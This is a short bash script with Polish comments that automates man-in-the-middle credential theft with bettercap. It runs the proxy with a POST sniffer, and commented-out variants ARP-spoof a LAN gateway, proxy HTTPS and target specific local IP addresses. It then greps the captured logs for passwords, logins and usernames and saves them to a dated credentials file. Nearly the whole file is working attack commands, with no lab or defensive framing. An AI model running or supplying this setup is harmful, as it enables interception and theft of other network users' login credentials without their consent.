#!/bin/bash

#filtrowanie wszystkich przechwytywania
sudo rm /home/ubuntu/credentials-bettercap/*
grep -in -E "pass|login|password|user" /home/ubuntu/bettercap-logs/* > /home/ubuntu/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt

#odpalenie programu bettercap
#sudo bettercap -I wlan0 -S ARP --gateway 192.168.1.254 -X --proxy-https --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs

#bez HTTPS
#sudo bettercap -I wlan0 --gateway 192.168.1.254  -X --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs

#z yt
#sudo bettercap -T 192.168.1.10,192.168.1.9,192.168.1.17 --proxy --proxy-https -P POST --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
sudo bettercap --proxy -P POST --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
